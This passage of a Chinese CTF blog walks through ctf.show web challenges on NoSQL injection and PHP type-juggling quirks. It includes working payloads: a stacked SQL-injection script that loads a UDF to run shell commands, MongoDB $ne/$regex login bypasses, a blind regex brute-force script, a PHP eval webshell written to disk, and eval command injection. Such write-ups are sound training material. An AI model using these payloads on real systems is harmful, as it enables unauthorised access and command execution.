A&#39;&#39;&#39;.format(sql)requests.get(url+payload) #引入自定义函数sql=&#39;&#39;&#39;create function sys_eval returns string soname &#39;udf.so\&#39;&#39;&#39;&#39;payload=&#39;&#39;&#39;0&#39;;&#123;&#125;;-- A&#39;&#39;&#39;.format(sql)requests.get(url+payload) #命令执行，结果更新到界面sql=&#39;&#39;&#39;update ctfshow_user set pass=(select sys_eval(&#39;cat /flag.her?&#39;))&#39;&#39;&#39;payload=&#39;&#39;&#39;0&#39;;&#123;&#125;;-- A&#39;&#39;&#39;.format(sql)requests.get(url+payload) #查看结果r=requests.get(url[:-4]+&#39;?page=1&amp;limit=10&#39;)print(r.text)</code></pre><h1 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h1><h2 id="nosql"><a href="#nosql" class="headerlink" title="nosql"></a>nosql</h2><p><a href="http://rui0.cn/archives/609">NoSQL注入小笔记</a></p><p><a href="https://www.anquanke.com/post/id/97211">冷门知识 — NoSQL注入知多少</a></p><pre><code>$gt : &gt;$lt : &lt;$gte: &gt;=$lte: &lt;=$ne : !=、&lt;&gt;$in : in$nin: not in$all: all $or:or$not: 反匹配(1.3.3及以上版本)模糊查询用正则式：db.customer.find(&#123;&#39;name&#39;: &#123;&#39;$regex&#39;:&#39;.*s.*&#39;&#125; &#125;)/*** : 范围查询 &#123; &quot;age&quot; : &#123; &quot;$gte&quot; : 2 , &quot;$lte&quot; : 21&#125;&#125;* : $ne &#123; &quot;age&quot; : &#123; &quot;$ne&quot; : 23&#125;&#125;* : $lt &#123; &quot;age&quot; : &#123; &quot;$lt&quot; : 23&#125;&#125;*/</code></pre><pre><code>//查询age = 22的记录db.userInfo.find(&#123;&quot;age&quot;: 22&#125;);//相当于：select * from userInfo where age = 22;//查询age &gt; 22的记录db.userInfo.find(&#123;age: &#123;$gt: 22&#125;&#125;);//相当于：select * from userInfo where age &gt; 22;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409144401500.png" alt="image-20220409144401243"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409144445953.png" alt="image-20220409144445953"></p><p>这题后端对id过滤了非数字，可能用的intval函数。这个函数在PHP特性那里出现过很多次了，利用这个特性：</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409144506190.png" alt="image-20220409144506190"></p><pre><code>?id[]=flag</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409144557902.png" alt="image-20220409144557902"></p><h1 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409144722019.png" alt="image-20220409144722019"></p><pre><code>  $query = new MongoDB\Driver\Query($data);  $cursor = $manager-&gt;executeQuery(&#39;ctfshow.ctfshow_user&#39;, $query)-&gt;toArray();//无过滤  if(count($cursor)&gt;0)&#123;    $ret[&#39;msg&#39;]=&#39;登陆成功&#39;;    array_push($ret[&#39;data&#39;], $flag);  &#125;</code></pre><p>没有任何的过滤，利用<code>$ne</code>就可以了</p><pre><code>username[$ne]=1&amp;password[$ne]=1</code></pre><p>正则也可以</p><pre><code>username[$regex]=.*&amp;password[$regex]=.*</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409150349590.png" alt="image-20220409150349590"></p><h1 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409150536078.png" alt="image-20220409150536078"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409150527537.png" alt="image-20220409150527537"></p><p>这次返回的是admin 的密码</p><p>改成username不等于admin</p><pre><code>username[$ne]=admin&amp;password[$ne]=1</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409150627591.png" alt="image-20220409150627591"></p><h1 id="web252"><a href="#web252" class="headerlink" title="web252"></a>web252</h1><pre><code>username[$ne]=admin&amp;password[$ne]=1</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409151108797.png" alt="image-20220409151108797"></p><p>username既不能是admin，也不能是admin1，那就正则表达式</p><pre><code>username[$regex]=^[^a].*$&amp;password[$ne]=1</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409151155741.png" alt="image-20220409151155741"></p><h1 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409151505085.png" alt="image-20220409151505085"></p><pre><code>mongodb的find().pretty()方法的作用。使得查询出来的数据在命令行中更加美观的显示，不至于太紧凑。</code></pre><pre><code class="python">&quot;&quot;&quot;Author : fengTime : 2021-2-14&quot;&quot;&quot;import requestsurl=&quot;http://2184e9b4-619a-43dd-b8de-015a6a74fe3d.chall.ctf.show:8080/api/&quot;flag=&quot;&quot;for i in range(1,100):    for j in &quot;&#123;-abcdefghijklmnopqrstuvwxyz0123456789&#125;&quot;:        payload=&quot;^&#123;&#125;.*$&quot;.format(flag+j)        data=&#123;            &#39;username[$regex]&#39;:&#39;flag&#39;,            &#39;password[$regex]&#39;:payload        &#125;        r=requests.post(url=url,data=data)        if r&quot;\u767b\u9646\u6210\u529f&quot; in r.text:            flag+=j            print(flag)            if j==&quot;&#125;&quot;:                exit()            break</code></pre><p>参考</p><p><a href="https://ego00.blog.csdn.net/">bfengj</a></p><p><a href="https://y4tacker.blog.csdn.net/">Y4tacker</a></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP特性</title>
      <link href="/ctfshow/ctf.show/PHP%E7%89%B9%E6%80%A7/"/>
      <url>/ctfshow/ctf.show/PHP%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262137710.png" alt="image-20220326213708674"></p><p>源码开局</p><p>intval()函数用于获取变量的整数值</p><p>intval()函数通过使用指定的进制base转换(默认是十进制)返回变量var的integer数值.intval()不能用于object,否则会产生E_NOTICE错误并返回1</p><p>preg_match()函数:判断输入的值是否存在指定字符</p><p>preg_match()函数无法处理数组,这里发现匹配到数字就死,但是intval()中又必须是数字,所以只能有一个不执行.那么要利用intval的话只能上面不执行,所以只要传个数组</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203262147089.png" alt="image-20220326214706034"></p><h1 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2020-09-16 11:25:09 Last Modified by:   h1xa Last Modified time: 2020-09-18 16:06:11 email: h1xa@ctfer.com link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;]))&#123;    $num = $_GET[&#39;num&#39;];    if($num===&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;</code></pre><pre><code>?num=4476a        弱类型?num=0x117c        十六进制?num=4476.0        小数点?num=+4476        正负号?num=4476e1        科学计数法?num=010574        八进制?num= 010574    八进制加空格</code></pre><h1 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h1><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: Firebasky Date:   2020-09-16 11:25:09 Last Modified by:   h1xa Last Modified time: 2020-09-18 16:16:09 link: https://ctfer.com*/show_source(__FILE__);include(&#39;flag.php&#39;);$a=$_GET[&#39;cmd&#39;];if(preg_match(&#39;/^php$/im&#39;, $a))&#123;    if(preg_match(&#39;/^php$/i&#39;, $a))&#123;        echo &#39;hacker&#39;;    &#125;    else&#123;        echo $flag;    &#125;&#125;else&#123;    echo &#39;nonononono&#39;;&#125; </code></pre><p>m表示匹配多行</p><pre><code>?cmd=11%0aphp</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403222600621.png" alt="image-20220403222600621"></p><pre><code>i不区分大小写m多(more)行匹配,若存在换行\n并且有开始^或结束$符的情况下,将以换行为分隔符,逐行进行匹配s特殊字符圆点.中包含换行符.默认的圆点.是匹配除换行符\n之外的任何单字符,加上s之后,.包含换行符A强制从目标字符串开头匹配D如果使用$限制结束字符,则不允许结尾有换行符e配合函数preg_replace()使用,可以把匹配来的字符串当作正则表达式来执行</code></pre><h1 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: Firebasky Date:   2020-09-16 11:25:09 Last Modified by:   h1xa Last Modified time: 2020-09-18 16:29:30 link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;]))&#123;    $num = $_GET[&#39;num&#39;];    if($num==4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)==4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125; </code></pre><pre><code>int intval ( mixed $var [, int $base = 10 ] )参数说明：    $var：要转换成 integer 的数量值。    $base：转化所使用的进制。        base如果是0,通过检测,var的格式来决定使用的进制        如果包含了0x的前缀,使用16进制(hex);        如果使用0开头,使用8进制        否则使用十进制</code></pre><pre><code>?num=0x117c        十六进制?num=4476e1        科学计数法?num=010574        八进制?num= 010574    八进制加空格</code></pre><p>intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊,可以再php中不是科学计数法.所以就可以构造4476e123.在弱类型比较适合,4476e123是科学计数法4476*10^123,而在intval函数中,遇到字母就停止读取,因此是4476.</p><h1 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h1><pre><code class="php">&lt;?php/*# -*- coding: utf-8 -*- Author: Firebasky Date:   2020-09-16 11:25:09 Last Modified by:   h1xa Last Modified time: 2020-09-18 16:32:58 link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;]))&#123;    $num = $_GET[&#39;num&#39;];    if($num==4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)==4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;</code></pre><pre><code>?num=010574     八进制?num= 010574    八进制加空格</code></pre><h1 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2020-09-16 11:25:09 Last Modified by:   h1xa Last Modified time: 2020-09-18 16:46:19 link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;]))&#123;    $num = $_GET[&#39;num&#39;];    if($num===&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(!strpos($num, &quot;0&quot;))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;&#125; </code></pre><pre><code> strpos() 函数 strpos() 函数查找字符串在另一字符串中第一次出现的位置</code></pre><p>必须要找到0,并且不能在第一位</p><pre><code>?num=4476.0        小数点?num=4476@0        特殊字符?num= 010574    八进制加空格</code></pre><p>好多都可以</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403224744676.png" alt="image-20220403224744676"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403224856742.png" alt="image-20220403224856742"></p><h1 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2020-09-16 11:25:09 Last Modified by:   h1xa Last Modified time: 2020-09-18 16:53:59 link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#39;num&#39;]))&#123;    $num = $_GET[&#39;num&#39;];    if($num==4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;/[a-z]|\./i&quot;, $num))&#123;        die(&quot;no no no!!&quot;);    &#125;    if(!strpos($num, &quot;0&quot;))&#123;        die(&quot;no no no!!!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;&#125; </code></pre><pre><code>?num= 010574    八进制加空格?num=%20010574    正负号八进制</code></pre><h1 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2020-09-16 11:25:09 Last Modified by:   h1xa Last Modified time: 2020-09-18 19:21:24 link: https://ctfer.com*/highlight_file(__FILE__);if(isset($_GET[&#39;u&#39;]))&#123;    if($_GET[&#39;u&#39;]==&#39;flag.php&#39;)&#123;        die(&quot;no no no&quot;);    &#125;else&#123;        highlight_file($_GET[&#39;u&#39;]);    &#125;&#125;</code></pre><pre><code>?u=php://filter/read=convert.base64-encode/resource=flag.php?u=/var/www/html/flag.php                 绝对路径?u=./flag.php                             相对路径?u=php://filter/resource=flag.php        php伪协议</code></pre><h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2020-09-16 11:25:09 Last Modified by:   h1xa Last Modified time: 2020-09-18 19:36:32 link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if (isset($_POST[&#39;a&#39;]) and isset($_POST[&#39;b&#39;])) &#123;if ($_POST[&#39;a&#39;] != $_POST[&#39;b&#39;])if (md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;]))echo $flag;elseprint &#39;Wrong.&#39;;&#125;?&gt;</code></pre><pre><code>php中md5()函数无法处理数组a[]=1&amp;b[]=2md5碰撞a=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&amp;b=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab在送一个%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab</code></pre><p><a href="https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value">md5强碰撞收集</a></p><h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1><pre><code class="php">Notice: Undefined index: flag in /var/www/html/index.php on line 15Notice: Undefined index: flag in /var/www/html/index.php on line 16Notice: Undefined index: HTTP_FLAG in /var/www/html/index.php on line 17&lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2020-09-16 11:25:09 Last Modified by:   h1xa Last Modified time: 2020-09-18 21:39:27 link: https://ctfer.com*/include(&quot;flag.php&quot;);$_GET?$_GET=&amp;$_POST:&#39;flag&#39;;#如果get存在get就等于post,否则get就等于flag$_GET[&#39;flag&#39;]==&#39;flag&#39;?$_GET=&amp;$_COOKIE:&#39;flag&#39;;#如果get的flag=flag那么get等于cookie否则get等于flag$_GET[&#39;flag&#39;]==&#39;flag&#39;?$_GET=&amp;$_SERVER:&#39;flag&#39;;highlight_file($_GET[&#39;HTTP_FLAG&#39;]==&#39;flag&#39;?$flag:__FILE__);#如果getHTTP_FLAG等于flag输出flag否则输出__FILE__?&gt;</code></pre><p>当get传入值时,get就等于post,那么post传入值也就是get传入值,所以get随便传一个然后post  HTTP_FLAG等于flag</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404114658416.png" alt="image-20220404114658416"></p><h1 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2020-09-16 11:25:09 Last Modified by:   h1xa Last Modified time: 2020-09-18 22:36:12 link: https://ctfer.com*/highlight_file(__FILE__);$allow = array();#定义一个allow数组for ($i=36; $i &lt; 0x36d; $i++) &#123; 0x36d=877    array_push($allow, rand(1,$i));#像数组的尾部插入一个或者多个元素&#125;#如果设置了n并且n在allow中,这里的在的含义是==也就是弱类型if(isset($_GET[&#39;n&#39;]) &amp;&amp; in_array($_GET[&#39;n&#39;], $allow))&#123;    file_put_contents($_GET[&#39;n&#39;], $_POST[&#39;content&#39;]);&#125;#就把content写入n中?&gt;</code></pre><p>传一个</p><pre><code>?n=1.phppostcontent=&lt;?php @eval($_POST[zf]);?&gt;</code></pre><p>至于这里为什么传一,是因为range(1,$i)中每次都包含1,所以1的概率最大</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404120628243.png" alt="image-20220404120628243"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404120134056.png" alt="image-20220404120134056"></p><p>接着去访问这个文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404120158331.png" alt="image-20220404120158331"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404120721930.png" alt="image-20220404120721930"></p><h1 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2020-09-16 11:25:09 Last Modified by:   h1xa Last Modified time: 2020-09-21 22:10:28 link: https://ctfer.com*/highlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#39;v1&#39;];$v2=$_GET[&#39;v2&#39;];$v3=$_GET[&#39;v3&#39;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;    if(!preg_match(&quot;/\;/&quot;, $v2))&#123;        if(preg_match(&quot;/\;/&quot;, $v3))&#123;            eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;);        &#125;    &#125;  &#125;?&gt;</code></pre><pre><code>is_numeric() 函数用于检测变量是否为数字或数字字符串。bool is_numeric ( mixed $var )参数说明：    $var：要检测的变量。返回值如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，注意浮点型返回 1，即 TRUE。</code></pre><h2 id="and-与-amp-amp"><a href="#and-与-amp-amp" class="headerlink" title="and 与 &amp;&amp;"></a>and 与 &amp;&amp;</h2><pre><code class="php">因为赋值运算的优先级比AND和OR的高，所以先赋值；比&amp;&amp;和||的低，所以逻辑运算符先执行，先逻辑运算，再赋值&lt;?php$v0=true and false and false;echo var_dump($v0);$v0=true &amp;&amp; false &amp;&amp;false;echo var_dump($v0);?&gt;#bool(true)#bool(false)</code></pre><p>那么这里只要$v1是数字就可以返回$v0为true</p><h2 id="反射类ReflectionClass使用"><a href="#反射类ReflectionClass使用" class="headerlink" title="反射类ReflectionClass使用"></a>反射类ReflectionClass使用</h2><p>可以直接输出这个类,也就是构造出echo new ReflectionClass(‘ctfshow’);</p><pre><code>?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404123333490.png" alt="image-20220404123333490"></p><p>反射类不仅仅可以建立对类的映射,也可以建立对php方法的映射,返回对php基本方法的映射,返回基本方法的执行情况,因此可以通过建立</p><pre><code>new ReflectionClass(system(&#39;dir&#39;));</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404123544581.png" alt="image-20220404123544581"></p><p>对反射类的理解</p><pre><code class="php">&lt;?phpclass A&#123;public static $flag=&quot;flag&#123;123123123&#125;&quot;;const  PI=3.14;static function hello()&#123;    echo &quot;hello&lt;/br&gt;&quot;;&#125;&#125;$a=new ReflectionClass(&#39;A&#39;);var_dump($a-&gt;getConstants());  获取一组常量输出 array(1) &#123;  [&quot;PI&quot;]=&gt;  float(3.14)&#125;var_dump($a-&gt;getName());    获取类名输出string(1) &quot;A&quot;var_dump($a-&gt;getStaticProperties()); 获取静态属性输出array(1) &#123;  [&quot;flag&quot;]=&gt;  string(15) &quot;flag&#123;123123123&#125;&quot;&#125;var_dump($a-&gt;getMethods()); 获取类中的方法输出array(1) &#123;  [0]=&gt;  object(ReflectionMethod)#2 (2) &#123;    [&quot;name&quot;]=&gt;    string(5) &quot;hello&quot;    [&quot;class&quot;]=&gt;    string(1) &quot;A&quot;  &#125;&#125;</code></pre><p>非预期解</p><pre><code>直接输出$ctfshow    构造 var_dump($ctfshow);?v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;</code></pre><pre><code>过滤不多可以直接执行命令?v1=1&amp;v2=?&gt;&lt;?php echo `ls`?&gt;/*&amp;v3=;*/?v1=1&amp;v2=system(&#39;ls&#39;)&amp;v3=-1;</code></pre><pre><code>flag_is_ab5f4bb70x2df6d60x2d47470x2dbd3a0x2de12e3c8a7416ctfshow&#123;ab5f4bb7-f6d6-4747-bd3a-e12e3c8a7416&#125;要构造一下,将0x2b转换成-哦</code></pre><h1 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2020-09-16 11:25:09 Last Modified by:   h1xa Last Modified time: 2020-09-22 00:26:48 link: https://ctfer.com*/highlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#39;v1&#39;];$v2=$_GET[&#39;v2&#39;];$v3=$_GET[&#39;v3&#39;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#39;|\,|\.|\;|\?|[0-9]/&quot;, $v2))&#123;        if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#39;|\,|\.|\?|[0-9]/&quot;, $v3))&#123;            eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;);        &#125;    &#125;    &#125;?&gt;Notice: Undefined index: v1 in /var/www/html/index.php on line 17Notice: Undefined index: v2 in /var/www/html/index.php on line 18Notice: Undefined index: v3 in /var/www/html/index.php on line 19</code></pre><p>这里将上一关的非预期给过滤了</p><pre><code>?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404132535124.png" alt="image-20220404132535124"></p><p>还是要构造一下</p><pre><code>flag_649e19730x2d39050x2d4cb20x2d900b0x2d3b4c30b15a4ctfshow&#123;649e1973-3905-4cb2-900b-3b4c30b15a4&#125;要爆破最后一位哦ctfshow&#123;ab5f4bb7-f6d6-4747-bd3a-e12e3c8a7416&#125;#上关的少一位</code></pre><h1 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: atao Date:   2020-09-16 11:25:09 Last Modified by:   h1xa Last Modified time: 2020-09-23 20:59:43*/highlight_file(__FILE__);$v1 = $_POST[&#39;v1&#39;];$v2 = $_GET[&#39;v2&#39;];$v3 = $_GET[&#39;v3&#39;];$v4 = is_numeric($v2) and is_numeric($v3);if($v4)&#123;    $s = substr($v2,2);#这里是从第二个开始,也就是去除前面两个字符    $str = call_user_func($v1,$s);#调用v1函数,并传入$s    echo $str;    file_put_contents($v3,$str);#将str也就是v2写入v3中&#125;else&#123;    die(&#39;hacker&#39;);&#125;?&gt;</code></pre><pre><code>call_user_func — 把第一个参数作为回调函数调用说明mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] )第一个参数 callback 